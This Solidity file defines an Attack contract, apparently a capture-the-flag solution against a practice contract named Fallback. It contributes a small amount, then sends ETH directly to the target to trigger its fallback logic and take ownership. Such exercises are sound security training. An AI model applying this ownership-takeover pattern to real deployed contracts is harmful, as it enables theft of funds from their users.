// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallback} from "./Fallback.sol";

contract Attack {
    Fallback fb;
    constructor(address payable _fb) payable {
        fb = Fallback(_fb);
    }

    function attack() public {
        fb.contribute{value: 0.0001 ether}();

        (bool ok,) = address(fb).call{value: 0.0001 ether}("");
        require(ok, "send ETH failed");
    }

}